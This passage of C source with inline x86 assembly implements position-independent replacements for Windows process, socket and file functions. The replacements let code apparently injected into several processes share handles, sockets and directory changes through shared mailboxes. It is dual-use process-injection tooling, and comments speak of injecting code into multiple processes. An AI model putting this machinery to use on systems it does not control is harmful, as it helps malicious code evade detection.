	//-------------------------------------------------------------------------------------------------------
	// createprocess_sweep(): CreateProcessW() replacement. We also have to replace this function because we have
	//	the dependency  GetStartupInfoW -> CreateProcessW. This means that CreateProcessW() is the "sweep"
	//	replacement. Apart from that, there's one more thing that we have to take care of it: We have 
	//	implicit HANDLE arguments in lpStartupInfo variable, that we have to resolve.
	//
	//	Remarks: Although we have a dependency it's possible to invoke this function without invoking
	//		GetStartupInfoW before.
	//
	// Arguments: LPCTSTR               lpApplicationName,
	//            LPTSTR                lpCommandLine,
	//            LPSECURITY_ATTRIBUTES lpProcessAttributes,
	//            LPSECURITY_ATTRIBUTES lpThreadAttributes,
	//            BOOL                  bInheritHandles,
	//            DWORD                 dwCreationFlags,
	//            LPVOID                lpEnvironment,
	//            LPCTSTR               lpCurrentDirectory,
	//            LPSTARTUPINFO         lpStartupInfo,
	//            LPPROCESS_INFORMATION lpProcessInformation
	//
	// Return Value: If the function succeeds, the return value is nonzero. Otherwise function returns zero.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_createprocess_sweep_addr:					//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// createprocess_sweep() function prolog
			// -------------------------------------------------------------------------
		createprocess_sweep:							//
			mov		eax, STACKBASEADDR2					// use bottom of stack to stack to store call cache
			mov		dword ptr[eax], ebx					// backup ebx
			// --------------------------------------------------------------------------
			// First we solve the dependency (if exists)
			// Be careful though! If between GetStartupInfoW() and CreateProcessW() we change any fields
			// of lpStartupInfo, we have to "backup" them, bacause GetStartupInfoW() will overwrite them.
			// --------------------------------------------------------------------------
			mov		eax, [esp + 0x24]					// get lpStartupInfo
			push	dword ptr [eax + 0x2c]				// backup dwFlags
			movzx	eax, word ptr[eax + 0x30]			// and wShowWindow
			push	eax									//
			// (don't backup HANDLEs because GetStartupInfoW won't overwrite them)
														//
			mov		eax, STACKBASEADDR2					// eax = call cache
			mov		ebx, dword ptr[eax + 8]				// get lpStartupInfo address
			test	ebx, ebx							// if we don't have a dependency, 
			je		createprocess_skip					// directly call CreateProcessW()
			push	ebx									// arg1: lpStartupInfo
			call	[eax + 4]							// invoke GetStartupInfoW()
														// 
		createprocess_skip:								//
			mov		eax, [esp + 0x24 + 8]				// get lpStartupInfo (you push'd 2 things)
			pop		dword ptr[eax + 0x30]				// restore dwFlags
			pop		word ptr[eax + 0x2c]				// restore wShowWindow (it's WORD)
			add		esp, 2								// adjust stack
			// --------------------------------------------------------------------------
			// Now, replace HANDLEs from duptab
			// --------------------------------------------------------------------------
			mov		eax, STACKBASEADDR2					// eax = call cache
			mov		ebx, dword ptr[esp + 0x24]				// get lpStartupInfo address
														//
			mov		eax, [ebx + 0x38]					// get lpStartupInfo->hStdInput
			call	locduphdl							// find the corresponding entry in duptab
			mov		[ebx + 0x38], eax					// and replace it
														//
			mov		eax, [ebx + 0x3c]					// get lpStartupInfo->hStdOutput
			call	locduphdl							// find the corresponding entry in duptab
			mov		[ebx + 0x3c], eax					// and replace it
														//
			mov		eax, [ebx + 0x40]					// get lpStartupInfo->hStdError
			call	locduphdl							// find the corresponding entry in duptab
			mov		[ebx + 0x40], eax					// and replace it
			// --------------------------------------------------------------------------
			// clear call cache
			// --------------------------------------------------------------------------
			mov		eax, STACKBASEADDR2					// eax = call cache
			mov		dword ptr[eax + 4], 0				// clear entries
			mov		dword ptr[eax + 8], 0				// (QWORDs doesn't seem to work)
			// --------------------------------------------------------------------------
			// Finally invoke CreateProcessW()
			// --------------------------------------------------------------------------
			mov		eax, STACKBASEADDR2					//
			mov		ebx, dword ptr[eax]					// restore ebx
			call	get_noebp_local_storage_eax			// get local storage
			jmp		dword ptr[eax+noebp_CreateProcessW]	// jump to CreateProcessW()
														// (return address is somewhere in emulated block)
	}
	//-------------------------------------------------------------------------------------------------------
	// bindpush(): This is the seconde chain of dependecies. However this time is not our fault. Microsoft
	//	claims that once WSADuplicateSocket() is called, the duplicated socket is identical with the 
	//	original. However if one process calls bind() with the original socket, and another process calls
	//	listen() with the duplicated socket, listen() will fail with a WSAEINVAL error. Furthermore accept()
	//	has also the same problem. This means that bind(), listen() and accept() must be invoked by the same
	//	process. Thus the dependency is: bind -> listen -> accept. We start with bind which is a "push"
	//	replacement.
	//
	// Arguments: SOCKET                s,
	//            const struct sockaddr *name,
	//            int                   namelen
	//
	// Return Value: Function always return 0 (success).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_bindpush_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// bindpush() function prolog
			// -------------------------------------------------------------------------
		bindpush:										//
			mov		eax, STACKBASEADDR					// use bottom of stack to stack to store call cache
			mov		dword ptr[eax], ebx					// backup ebx
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebx, ds:[eax + noebp_bind]			// get address of bind()
			mov		eax, STACKBASEADDR					//
														//
			mov		[eax + 0x4], ebx					// store function address in call cache
														// ignore 1st argument as it's going to be replaced
			mov		ebx, [esp + 0x8]					// store arguments in reverse order 
														// (the reverse of the reverse is straight!)
			mov		[eax + 0xc], ebx					// store name in the bottom
			mov		ebx, [esp + 0xc]					//
			mov		[eax + 0x8], ebx					// store namelen in the top
			mov		ebx, dword ptr[eax]					//
			xor		eax, eax							// success!
			retn 0xc 									// return and pop 3 arguments
	}
	//-------------------------------------------------------------------------------------------------------
	// listenpush(): This is the 2nd function in dependency chain. We work similar with bindpush(). All we
	//	do here, is to push the arguments and the function's entry point in call cache. (listen() is a 
	//	"push" replacement).
	//
	// Arguments: SOCKET s,
	//            int    backlog
	//
	// Return Value: Function always return 0 (success).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_listenpush_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// listenpush() function prolog
			// -------------------------------------------------------------------------
		listenpush:										//
			mov		eax, STACKBASEADDR					// use bottom of stack to stack to store call cache
			mov		dword ptr[eax], ebx					// backup ebx
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebx, ds:[eax + noebp_listen]		// get address of listen()
			mov		eax, STACKBASEADDR					//
														//
			mov		[eax + 0x10], ebx					// store address of listen()
			mov		ebx, [esp + 0x8]					// get 2nd argument
			// --------------------------------------------------------------------------
			// The value of listen can affect the maximum number duplicated sockets. For instance
			// if original program has backlog = 5 we can inject code in up to 5 processes.
			// --------------------------------------------------------------------------
			cmp		ebx, LISTEN_BACKLOG					// check if backlog is below limit
			ja		listenpush_backlog					//
			mov		ebx, LISTEN_BACKLOG					// if it is, change it
														//
		listenpush_backlog:								//
			mov		[eax + 0x14], ebx					// store backlog in call cache
			mov		ebx, dword ptr[eax]					// restore ebx
														//
			xor		eax, eax							// success!
			retn 0x8 									// return and pop 2 arguments
	}
	//-------------------------------------------------------------------------------------------------------
	// acceptsweep(): This is the last stage of bind -> listen -> accept dependency. Accept is a "sweep" 
	//	replacement. So we have to clear call cache first, by calling bind() and listen() first. Everything
	//	is beautiful as long as we have no errors. If an error happened, e.g. in bind() it can't be handled
	//	by the original program, as we call it at a different point. So if bind() failed, program will think
	//	that accept() failed.
	//
	//	Note that if call cache is clear any call to acceptsweep() will execute only accept(). This is 
	//	absolutely desired, as a server almost always calls bind() and listen() once but accept() many 
	//	times.
	//
	// Arguments: SOCKET          s,
	//            struct sockaddr *addr,
	//            int             *addrlen
	//
	// Return Value: If no error occurs, accept returns a value of type SOCKET that is a descriptor for 
	//		the new socket. Otherwise function returns -1 (INVALID_SOCKET).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_acceptsweep_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// acceptsweep() function prolog
			// -------------------------------------------------------------------------
		acceptsweep:									//
			mov		eax, STACKBASEADDR					// use bottom of stack to stack to store call cache
			mov		dword ptr[eax], ebx					// backup ebx
			// --------------------------------------------------------------------------
			// call bind() first
			// --------------------------------------------------------------------------
			cmp		[eax + 0x4], 0x0					// empty call cache entry ?
			je		acceptsweep_skipbind				// if so, skip bind call
			mov		ebx, dword ptr[eax + 0x8]			// get namelen from call cache
			push	ebx									// arg3: namelen
			mov		ebx, dword ptr[eax + 0xc]			// get name from call cache
			push	ebx									// arg2: name
			mov		ebx, dword ptr[esp + 0x4 + 8]		// get replaced SOCKET (8 = we added 2 DWORDs)
			push	ebx									// arg1: s
			call	[eax + 0x4]							// call bind() hoping not to fail
			// --------------------------------------------------------------------------
			// then call listen()
			// --------------------------------------------------------------------------
		acceptsweep_skipbind:							//
			mov		eax, STACKBASEADDR					// 
			cmp		[eax + 0x10], 0x0					// empty call cache entry ?
			je		acceptsweep_skiplisten				// if so, skip listen() call
			mov		ebx, dword ptr[eax + 0x14]			//get backlog from call cache
			push	ebx									// arg2: backlog
			mov		ebx, dword ptr[esp + 0x4 + 4]		// get replaced SOCKET (8 = we added 1 DWORD)
			push	ebx									// arg1: s
			call	[eax + 0x10]						// call listen() hoping not to fail too
			// --------------------------------------------------------------------------
			// clear call cache
			// --------------------------------------------------------------------------
		acceptsweep_skiplisten:							//
			mov		eax, STACKBASEADDR					// eax = call cache
			mov		dword ptr[eax +  0x4], 0			// clear entries
			mov		dword ptr[eax +  0x8], 0			// 
			mov		dword ptr[eax +  0xc], 0			// 
			mov		dword ptr[eax + 0x10], 0			// 
			mov		dword ptr[eax + 0x14], 0			//
														//
			mov		ebx, dword ptr[eax]					// restore ebx
			// --------------------------------------------------------------------------
			// finally call accept()
			// --------------------------------------------------------------------------
			call	get_noebp_local_storage_eax			// get local storage
			jmp		dword ptr ds:[eax + noebp_accept]	// jump to accept() (socket is already replaced)
														// (return address is somewhere in emulated block)
		/*
			// or you can call accept() this way:
			push	[esp + 0xc]							// arg3 on stack
			push	[esp + 0xc]							// arg2 on stack
			push	[esp + 0xc]							// arg1 on stack (stack is moving, so offset remains const)
														//
			call	get_noebp_local_storage_eax			// get local storage
			call	ds:[eax + noebp_accept]				// call accept()
														//
			retn 0xc									// return and pop 3 args
		*/
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                      F I L E *   F U N C T I O N S   R E P L A C E M E N T S                      || //
// ++===================================================================================================++ //
//
// Although we can duplicate HANDLEs among different processes we can't do the same for FILE* pointers.
// At first this seems very limited. But what if we replace these functions with functions that have 
// the same functionality but the use HANDLEs instead? For example if we replace fopen() with our fopen()
// and in our fopen() we simply call CreateFile() then we'll be able to deal with FILE* pointers.
//
// Here, we implemented only functions needed for our samples. It's very easy to add more functions
// if needed.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// fopen(): This is the replacement of libc fopen(). As we are not allowed to use FILE* streams we have
	//	to do the same operation through windows API. Functions CreateFileA() and SetFilePointer() are enough
	//	to simulate fopen(). All we have to do is to call CreateFileA() with the right argument and in case
	//	that we have "a" mode we have to move file pointer to the end of file using SetFilePointer().
	//
	// Arguments (cdecl): const char *filename : File name
	//                    const char *mode     : Kind of access that's enabled
	//
	// Remarks: We have to find the match "mode" and CreateFile's dwDesiredAccess and dwCreationDisposition:
	//  "r" : GENERIC_READ  (1<<31), OPEN_EXISTING (3), SetFilePointer(BEGIN)
	//  "w" : GENERIC_WRITE (1<<30), CREATE_ALWAYS (2), SetFilePointer(BEGIN)
	//  "a" : GENERIC_WRITE (1<<30), OPEN_ALWAYS   (4), SetFilePointer(END)
	//  "r+": GENERIC_READ | GENERIC_WRITE (3<<30), OPEN_EXISTING (3), SetFilePointer(BEGIN)
	//  "w+": GENERIC_READ | GENERIC_WRITE (3<<30), CREATE_ALWAYS (2), SetFilePointer(BEGIN)
	//  "a+": GENERIC_READ | GENERIC_WRITE (3<<30), OPEN_ALWAYS   (4), SetFilePointer(END)
	//	(we don't consider other modes here as they're very rare to find them)
	//
	// Return Value: Function returns a pointer to the open file. A null pointer value indicates an error.
	//		In our case instead of a FILE* pointer, we return a HANDLE or 0 in case of an error.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_fopen_addr:									//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// fopen() function prolog
			// --------------------------------------------------------------------------
		_fopen:											// avoid coflicts with libc's fopen()
			push	ebp									// backup registers
			push	edx									// edx = dwCreationDisposition
			push	ecx									// ecx = dwDesiredAccess
			push	ebx									// ebx = fake ebp
			push	esi									// esi = file pointer position (BEGIN/END)
			pushfd										// backup flags
			lea		ebx, ds:[esp + 0x1c]				// fake ebp
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebp, ds:[eax + noebp_origebp]		// restore ebp (otherwise we can't call CreateFileA)
			// --------------------------------------------------------------------------
			// parse "mode" and set edx, ecx and esi
			// --------------------------------------------------------------------------
			mov		edx, [ebx + 4]						// edx = &mode
			mov		al, byte ptr[edx]					// get first letter (r, w or a)
			mov		ah, byte ptr[edx + 1]				// get second letter (+ or NULL)
			xor		esi, esi							// esi = FILE_BEGIN
														//
			cmp		al, 'r'								// check mode
			je		fopen_r								// mode == "r" ?
			cmp		al, 'w'								// check mode
			je		fopen_w								// mode == "w" ?
			cmp		al, 'a'								// check mode
			je		fopen_a								// mode == "a" ?
														//
			mov		eax, -1								// set error code
			jmp		fopen_null							// and return
														//
		fopen_r:										//
			mov		ecx, 0x80000000						// ecx = GENERIC_READ
			mov		edx, 0x3							// OPEN_EXISTING 
			jmp		fopen_plus							// skip the rest
														//
		fopen_w:										//
			mov		ecx, 0x40000000						// ecx = GENERIC_WRITE
			mov		edx, 0x2							// CREATE_ALWAYS
			jmp		fopen_plus							// skip the rest
														//
		fopen_a:										//
			mov		ecx, 0x40000000						// ecx = GENERIC_WRITE
			mov		edx, 0x4							// OPEN_ALWAYS
			mov		esi, 0x2							// FILE_END
														//
		fopen_plus:										// plus mode check
			test	ah, ah								// if we're not in plus mode
			jne		fopen_dofile						// do the file operation
			mov		ecx, 0xc0000000						// ecx = GENERIC_READ | GENERIC_WRITE			
			// --------------------------------------------------------------------------
			// call CreateFileA()
			// --------------------------------------------------------------------------
		fopen_dofile:
			push	0x00								// hTemplateFile: NULL
			push	0x80								// dwFlagsAndAttributes: FILE_ATTRIBUTE_NORMAL
			push	edx									// dwCreationDisposition: edx
			push	0x00								// lpSecurityAttributes: NULL
			push	0x00								// dwShareMode: None
			push	ecx									// dwDesiredAccess: ecx
			push	[ebx]								// lpFileName: filename
			call	[CreateFileA]						// call CreateFileA
			call	crtduphandle						// duplicate HANDLE (if it's -1, no problem)
			// --------------------------------------------------------------------------
			// in "a" and "a+" mode we must set file pointer to the end
			// --------------------------------------------------------------------------
			test	esi, esi							// esi == FILE_BEGIN,
			jz		fopen_epilog						// don't set file pointer
			mov		ebx, eax							// backup hFile
			push	0x02								// dwMoveMethod: FILE_END
			push	0x00								// lpDistanceToMoveHigh: 0
			push	0x00								// lDistanceToMove: 0
			push	eax									// hFile: The one returned by CreateFileA()
			call	[SetFilePointer]					// move file pointer
			// if HANDLE was invalid, function will return -1 (INVALID_SET_FILE_POINTER)
			cmp		eax, -1								// error returned?
			jz		fopen_null							// if so, return error
			mov		eax, ebx							// restore
			jmp		fopen_epilog						// skip null set
			// --------------------------------------------------------------------------
			// fopen() function epilog
			// --------------------------------------------------------------------------
		fopen_null:										//
			xor		eax, eax							// return NULL
		fopen_epilog:									// 
			popfd										// restore flags
			pop		esi									// restore registers
			pop		ebx									//
			pop		ecx									//
			pop		edx									//
			pop		ebp									//
			retn										// return (function is cdecl)
	}
	//-------------------------------------------------------------------------------------------------------
	// fputs(): This is the replacement of libc fputs(). This is pretty easy. All we have to do is to call
	//	WriteFile() with the right arguments.
	//
	// Arguments (cdecl): const char *str : Output string
	//                    FILE *stream    : Pointer to FILE (HANDLE) structure 
	//
	// Return Value: On success, a non-negative value is returned (number of bytes written to the file). On 
	//	error, function returns EOF (-1 in our case).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_fputs_addr:									//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// puts() function prolog
			// --------------------------------------------------------------------------
		_fputs:											// avoid coflicts with libc's fputs()
			push	ebp									// backup registers
			push	edx									// this modified by WriteFile()
			push	ecx									// needed for strlen()
			push	ebx									// 
			push	edi									// 
			pushfd										// backup flags
			lea		ebx, ds:[esp + 0x1c]				// fake ebp
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebp, ds:[eax + noebp_origebp]		// restore ebp
														//
			cmp		[ebx + 4], 0x00						// NULL file pointer?
			jz		fputs_epilog						// if so, jump to the epilog
			// --------------------------------------------------------------------------
			// find strlen(str); we need it for WriteFile()
			// --------------------------------------------------------------------------
			xor		eax, eax							// set al to NULL
			mov		edi, [ebx]							// edi must contain the string address
			xor		ecx, ecx							//
			not		ecx									// set ecx to -1
			cld											// clear Direction Flag (++ mode)
			repne scasb									// iterate over string until you find NULL
			not		ecx									// toggle, and ecx will contain strlen+1 (+1 is needed)
			dec		ecx									// remove 1, and you'll get the right size
			// --------------------------------------------------------------------------
			// call WriteFile()
			// --------------------------------------------------------------------------
			push	0x0000000							// push something on the stack
			lea		edi, ds:[esp]						// get address of the top of stack
														//
			mov		eax, [ebx + 4]						// eax = fake file pointer 
			call	locduphdl							// find the duplicated one
														//
			push	0x00								// lpOverlapped: NULL
			push	edi									// lpNumberOfBytesWritten: top of the stack
			push	ecx									// lpBuffer: strlen(str)
			push	[ebx]								// lpBuffer: str
			push	eax									// hFile: our file handle
			call	[WriteFile]							// write string to file
														//
			test	eax, eax							// FALSE returned?
			jz		fputs_error							// if so, return EOF. otherwise, set
			pop		eax									// return value to lpNumberOfBytesWritten
			jmp		fputs_epilog						// skip error set
			// --------------------------------------------------------------------------
			// fputs() function epilog
			// --------------------------------------------------------------------------
		fputs_error:									//
			mov		eax, -1								// set return value to EOF
			add		esp, 4								// remove lpNumberOfBytesWritten from stack
		fputs_epilog:									//
			popfd										// restore flags
			pop		edi									// restore registers
			pop		ebx									//
			pop		ecx									//
			pop		edx									//
			pop		ebp									//
			retn										// return (function is cdecl)
	}
	//-------------------------------------------------------------------------------------------------------
	// fputc(): This is the replacement of libc fputs(). It's a special case of fputs() where we have to 
	//	write 1 character only. So we can pass the address of this character (character must be followed by 
	//	a null) and then call fputs().
	//
	// Arguments (cdecl): int character : The int promotion of the character to be written
	//                    FILE* stream  : Pointer to a FILE (HANDLE) object that identifies an output stream
	//
	// Return Value: On success, the character written is returned. If an error occurs, EOF is returned.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_fputc_addr:									//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// putc() function prolog
			// --------------------------------------------------------------------------
		_fputc:											// avoid coflicts with libc's fputc()
			pushfd										// backup flags
														//
			cmp		[esp + 0xc], 0x00					// NULL file pointer?
			jz		fputc_epilog						// if so, jump to the epilog
			// --------------------------------------------------------------------------
			// convert char to char* and call fputs()
			// --------------------------------------------------------------------------
			push	[esp + 0xc]							// stream: fake FILE*
			push	esp									// str: character (it's NULL extended to 32 bits)
			add		[esp], 0xc							// +16 +4 to point to the 2nd argument
			call	_fputs								// call our fputs()
			add		esp, 8								// clear stack (it's cdecl)
														//
			cmp		eax, -1								// error returned?
			jz		fputc_epilog						// if so return -1
			mov		eax, [esp + 0x8]					// otherwise return character copied
			// --------------------------------------------------------------------------
			// fputc() function epilog
			// --------------------------------------------------------------------------
		fputc_epilog:									//
			popfd										// restore flags
			retn										// return (function is cdecl)
	}
	//-------------------------------------------------------------------------------------------------------
	// fclose(): This is the replacement of libc fclose(). All we have to do is to close the HANDLE and 
	//	inform the other processes to do the same
	//
	// Arguments (cdecl): FILE* stream : Pointer to a FILE (HANDLE) object that specifies the stream 
	//                                   to be closed
	//
	// Return Value: If the stream (HANDLE) is successfully closed, a zero value is returned. On failure,
	//	EOF is returned.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_fclose_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// fclose() function prolog
			// --------------------------------------------------------------------------
		_fclose:										//
			push	ebp									// backup ebp
			push	ecx									// CloseHandle will modify ecx, edx
			push	edx									// 
			pushfd										// backup flags								
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebp, ds:[eax + noebp_origebp]		// restore ebp
														//
			cmp		[esp + 0x14], 0x00					// NULL file pointer?
			jz		fclose_epilog						// if so, jump to the epilog
			// --------------------------------------------------------------------------
			// call closedupsock() and CloseHandle()
			// --------------------------------------------------------------------------
			mov		eax, [esp + 0x14]					// get HANDLE
			call	closedupsock						// tell other processes to close it
														//
			push	eax									//
			call	[CloseHandle]						// close handle

			test	eax, eax							// FALSE returned
			jnz		fclose_epilog						//
			mov		eax, -1								// set return value to eof
			// --------------------------------------------------------------------------
			// fclose() function epilog
			// --------------------------------------------------------------------------
		fclose_epilog:
			popfd										// restore flags
			pop		edx									// restore registers
			pop		ecx									// 
			pop		ebp									// 
			retn										// return (function is cdecl)
	}
	//-------------------------------------------------------------------------------------------------------
	// fprintf(): This is the replacement of libc fprintf(). At a first glance replacing fprintf() may be 
	//	extremely difficult. However it's very easy. All we have to do is to allocate a buffer (large enough
	//	to avoid overflows) and then call sprintf. After that we pass this buffer to puts().
	//
	// Arguments (cdecl): FILE* stream       : Pointer to FILE structure
	//                    const char *format :  Format-control string
	//
	//
	// Return Value: Function returns the number of bytes written. In case of an error, a negative (let's 
	//	say -1) value is returned.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_fprintf_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// fprintf() function prolog
			// --------------------------------------------------------------------------
		_fprintf:										//
			
			/*
			**	TODO: NOT IMPLEMENTED YET.
			*/

			int 3										// cause an interrupt
	}
	//-------------------------------------------------------------------------------------------------------
	__asm {
		/*
		** You can declare your more FILE* function replacements here
		*/
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                                O T H E R   R E P L A C E M E N T S                                || //
// ++===================================================================================================++ //
//
// Here we have some other replacements for problematic functions. We also provide the implementation of
// second_order_hooks() which is responsible for hooking a library fuctiion with its replacement.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// exitprocess(): ExitProcess() replacement. All we have to do is to fill all entries of thrdst will
	//	UNUSED.
	//
	// Arguments: uExitCode (UINT) : The exit code for the process and all threads.
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_exitprocess_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// exitprocess() function prolog
			// --------------------------------------------------------------------------
		exitprocess:									//
			push	ebp									// backup registers that you're going to use
			push	esi									//
			push	edi									//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		esi, [loctrl]						// esi = &loctrl
			mov		edi, [nxtthrd]						// current thread has nxtthrd id
														// loctrl->thrdrtn[nxtthrd] = THREAD_UNUSED
			mov		[esi + THRDSTOFF], THREAD_UNUSED	// clear 1st entry
			mov		[esi + THRDSTOFF+ 2], THREAD_UNUSED	// 2nd
			mov		[esi + THRDSTOFF+ 4], THREAD_UNUSED	// 3rd
			mov		[esi + THRDSTOFF+ 6], THREAD_UNUSED	// 4th (don't loop for 4 entries!)
			// --------------------------------------------------------------------------
			// exitprocess() function epilog
			// --------------------------------------------------------------------------
			pop		edi									// restore registers
			pop		esi									//
			pop		ebp									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// setcurrentdir(): setcurrentdir() replacement.
	//		This function works as follows: At first we call SetCurrentDirectory() to change current 
	//		directory. Then we have to send a mail to every process with the new directory. However we have
	//		a problem here: setcurrentdir() is the replacement for both ANSI and UNICODE versions of
	//		SetCurrentDirectory(). However it's hard to copy the new directory (from argument) to each 
	//		process's mailbox, string may be NULL terminated or double-NULL terminated. Thus we either need
	//		2 replacements, or we can simply call GetCurrentDirectoryW() after SetCurrentDirectory() and
	//		obtain the current directory. We'll use method 2 here.
	//
	// Arguments: LPCTSTR lpPathName
	//
	// Return Value: If the function succeeds, the return value is nonzero. Otherwise, return value is zero. 
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_setcurrentdir_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// setcurrentdir() function prolog
			// --------------------------------------------------------------------------
		setcurrentdir:									//
			push	ebp									// we're going to modify ebp
			push	edx									// backup registers that you're going to use
			push	ebx									//
			push	esi									//
			push	edi									//
			sub		esp, 0x10							// create a stack frame
														//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		ebx, dword ptr ds:[esi + noebp_pid]	//
			mov		[esp + 4], ebx						// v4 = pid
			// --------------------------------------------------------------------------
			// change directory
			// --------------------------------------------------------------------------			
			push	[esp + 0x10 + 0x14 + 0x4]			// arg1: lpPathName (copy from original arguments)
			call	[SetCurrentDirectory]				// change directory
			mov		[esp + 8], eax						// store original return value
			// --------------------------------------------------------------------------
			// now send new directory to each process
			// (you'll see again an ugly code repetition from crtdusock here :( ...)
			// --------------------------------------------------------------------------
			mov		esi, [loctrl]						// esi = &loctrl
			lea		edi, [esi + MAILBOXOFF]				// edi = loctrl->mailbox
			movzx	ecx, word ptr[esi + NPROCOFF]		// ecx = loctrl->nproc
			add		esi, PIDTABOFF						// esi = loctrl->pidtab
														//
		setcurrentdir_loop:								//
			mov		ebx, [esi + ecx*4 - 4]				// ebx = loctrl->pidtab[ecx - 1]
			test	ebx, ebx							// DEBUG ONLY: if it's NULL, don't duplicate
			jz		setcurrentdir_skip					// (pid's are sequential, so we can't have NULLs)
			cmp		ebx, [esp + 0x4]					// compare pid with your pid
			//jz		setcurrentdir_skip					// don't write on your own mailbox!
			// --------------------------------------------------------------------------
			// send message to every pid through mailbox
			// --------------------------------------------------------------------------
			mov		[esp + 0xc], ecx					// backup ecx
			lea		edx, [ecx - 1]						// off by one to ecx
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		ecx, MAXMAILBOXSIZE					// maximum number of slots
														//
		setcurrentdir_find_empty_mail_slot:				//
			cmp		word ptr[edi + edx], 0x0000			// is slot filled?
			je		setcurrentdir_empty_mail_slot_found	// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			loop	setcurrentdir_find_empty_mail_slot	// continue search
														// if you reach this point, all slots are filled
			jmp		setcurrentdir_cleanup				// so, do not send
														//
		setcurrentdir_empty_mail_slot_found:			// send message to mailbox
			mov		word ptr[edi+edx], CMD_SET_CURRENT_DIR	// loctrl->mailbox[ecx-1].cmd = CMD_SET_CURRENT_DIR
			// --------------------------------------------------------------------------
			// call GetCurrentDirectoryW() to get new directory path
			// --------------------------------------------------------------------------
			push	esi									// backup esi
			lea		esi, [edi + edx + 0x10]				// esi = &loctrl->mailbox[ecx-1].data
			push	esi									// arg2: lpBuffer			
			push	MAILBOXSIZE - 16					// arg1: nBufferLength
			call	[GetCurrentDirectory]				// get current directory
			pop		esi									// restore esi
														//
			mov		ecx, [esp + 0xc]					// restore ecx
		setcurrentdir_skip:								//
			loop	setcurrentdir_loop					// get next entry														
			// --------------------------------------------------------------------------
			// setcurrentdir() function epilog
			// --------------------------------------------------------------------------
		setcurrentdir_cleanup:							//
			mov		eax, [esp + 8]						// get value returned by original SetCurrentDirectory
														//
			add		esp, 0x10							// release stack frame
			pop		edi									// restore registers
